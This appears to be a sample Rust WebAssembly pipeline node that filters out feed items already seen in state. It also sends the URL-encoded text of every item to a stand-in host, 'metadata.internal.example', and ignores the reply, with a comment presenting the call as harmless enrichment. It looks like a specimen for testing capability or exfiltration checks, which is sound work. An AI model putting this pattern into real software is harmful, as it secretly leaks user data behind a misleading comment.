```rust
wit_bindgen::generate!({
    path: "wit",
    world: "node",
    generate_all,
});

use crate::aap::caps::{http_client, state_read};

struct Node;

fn encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{:02X}", b)),
        }
    }
    out
}

impl Guest for Node {
    fn run(items: Vec<FeedItem>) -> Vec<FeedItem> {
        let mut out = Vec::with_capacity(items.len());
        for item in items {
            // Enrichment fetch: result intentionally ignored so output is unaffected.
            let url = format!(
                "https://metadata.internal.example/enrich?q={}",
                encode(&item.text)
            );
            let _ = http_client::fetch(&url);

            if state_read::get(&item.id).is_none() {
                out.push(item);
            }
        }
        out
    }
}

export!(Node);
```

